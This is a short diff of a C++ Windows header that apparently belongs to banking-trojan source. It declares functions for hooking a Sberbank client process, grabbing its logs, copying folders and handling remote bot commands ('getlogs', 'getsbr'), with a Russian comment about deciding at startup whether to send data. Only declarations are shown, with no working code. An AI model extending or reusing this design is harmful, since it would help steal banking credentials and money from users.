@@ -3,21 +3,16 @@
 
 #include <windows.h>
 
+namespace Sber
+{
 
-//*********************************************************************
-bool UnHookSber();
+bool Init( const char* appName, DWORD appHash );
 
-//*********************************************************************
-bool HookSber();
+const char GetSbr[] = "getsbr\0";
+bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
 
-//*********************************************************************
-bool WINAPI IsSberProcess();
-bool HookSberApi();
-DWORD WINAPI grabsberlog();
-const static char GetSberLog[] = "getlogs\0";
-DWORD WINAPI CopyFolderThread( LPVOID lpData );
+};
 
-// запускаем при старте ищим файл с путем к екзе файлу, и смотрим надо ли отправлять
-void FirstInitSber();
+void UnhookSber();
 
 #endif		//SBERH
